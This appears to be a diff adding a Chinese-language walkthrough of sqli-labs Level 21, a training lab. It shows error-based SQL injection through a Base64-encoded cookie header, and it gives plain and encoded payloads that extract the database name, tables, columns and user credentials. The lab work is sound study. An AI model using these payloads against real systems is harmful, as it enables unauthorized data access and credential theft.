@@ -2642,5 +2642,240 @@ insert into 'security'.'某个表'(uagent,ipadd,username) values('' and extractv
 
 
 
-### Level-21
+### Level-21 Cookie头注入+Base64
 
++ 首先启动<code>burpsuite</code>和打开<code>sqli-labs</code>靶场
+
+![Less-21_1](./img/Less-21_1.PNG)
+
+
+
++ 输入账号<code>admin</code>和密码<code>admin</code>，返回<code>cookie</code>头。但<code>cookie</code>却是一串奇怪的字符串，看得出来这是<code>base64</code>编码
+
+![Less-21_3](./img/Less-21_3.PNG)
+
+![Less-21_2](./img/Less-21_2.PNG)
+
+<code>base64</code>解码，得到原来的变量<code>admin</code>
+
+![Less-21_4](./img/Less-21_4.PNG)
+
+所以21关与20关的区别主要是<code>cookie</code>头有无<code>base64</code>编码的问题
+
+
+
++ 爆库名
+
+~~~ shell
+admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1
+~~~
+
+<code>base64</code>编码后
+
+~~~ shell
+YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE=
+~~~
+
+![Less-21_3](./img/Less-21_3.PNG)
+
+![Less-21_5](./img/Less-21_5.PNG)
+
+
+
+打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据
+
+![Less-21_6](./img/Less-21_6.PNG)
+
+
+
+成功爆破出库名<code>security</code>
+
+![Less-21_7](./img/Less-21_7.PNG)
+
+
+
++ 爆数据表名
+
+~~~ shell
+') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+~~~
+
+<code>base64</code>编码后
+
+~~~ shell
+JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSksMHg3ZSksMSkj
+~~~
+
+![Less-21_8](./img/Less-21_8.PNG)
+
+
+
+打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据
+
+![Less-21_3](./img/Less-21_3.PNG)
+
+将
+
+~~~ shell
+Cookie: uname=YWRtaW4%3D
+~~~
+
+![Less-21_16](./img/Less-21_16.PNG)
+
+改为
+
+~~~ shell
+Cookie: uname=YWRtaW4x
+~~~
+
+![Less-21_17](./img/Less-21_17.PNG)
+
+再添加
+
+~~~shell
+JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSksMHg3ZSksMSkj
+~~~
+
+改为
+
+~~~ shell
+Cookie: uname=YWRtaW4xJykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSksMHg3ZSksMSkj
+~~~
+
+其base64解码是
+
+~~~ shell
+admin1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+~~~
+
+![Less-21_20](./img/Less-21_20.PNG)
+
+
+
+成功爆破出数据表名
+
+![Less-21_10](./img/Less-21_10.PNG)
+
+
+
++ 爆数据列名
+
+~~~ shell
+') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
+~~~
+
+<code>base64</code>编码后
+
+~~~ shell
+JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGFuZCB0YWJsZV9uYW1lPSd1c2VycycpLDB4N2UpLDEpIw==
+~~~
+
+![Less-21_11](./img/Less-21_11.PNG)
+
+
+
+打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据
+
+将
+
+~~~ shell
+Cookie: uname=YWRtaW4%3D
+~~~
+
+![Less-21_16](./img/Less-21_16.PNG)
+
+改为
+
+~~~ shell
+Cookie: uname=YWRtaW4x
+~~~
+
+![Less-21_17](./img/Less-21_17.PNG)
+
+再添加
+
+~~~ shell
+JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGFuZCB0YWJsZV9uYW1lPSd1c2VycycpLDB4N2UpLDEpIw==
+~~~
+
+改为
+
+~~~ shell
+Cookie: uname=YWRtaW4xJykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGFuZCB0YWJsZV9uYW1lPSd1c2VycycpLDB4N2UpLDEpIw==
+~~~
+
+其<code>base64</code>解码是
+
+~~~ shell
+admin1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
+~~~
+
+![Less-21_12](./img/Less-21_12.PNG)
+
+
+
+成功爆出列名
+
+![Less-21_13](./img/Less-21_13.PNG)
+
+
+
++ 爆数据
+
+~~~ shell
+')and updatexml  (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#
+~~~
+
+<code>base64</code>编码之后：
+
+~~~ shell
+JylhbmQgdXBkYXRleG1sICAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSkj
+~~~
+
+![Less-21_14](./img/Less-21_14.PNG)
+
+
+
+打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据
+
+将
+
+~~~ shell
+Cookie: uname=YWRtaW4%3D
+~~~
+
+![Less-21_16](./img/Less-21_16.PNG)
+
+改为
+
+~~~ shell
+Cookie: uname=YWRtaW4x
+~~~
+
+![Less-21_17](./img/Less-21_17.PNG)
+
+再添加
+
+~~~ shell
+JylhbmQgdXBkYXRleG1sICAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSkj
+~~~
+
+改为
+
+~~~ shell
+Cookie: uname=YWRtaW4xJylhbmQgdXBkYXRleG1sICAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSkj
+~~~
+
+其<code>base64</code>解码为
+
+~~~ shell
+admin1')and updatexml  (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#
+~~~
+
+![Less-21_18](./img/Less-21_18.PNG)
+
+
+
+成功爆破数据
+
+![Less-21_19](./img/Less-21_19.PNG)
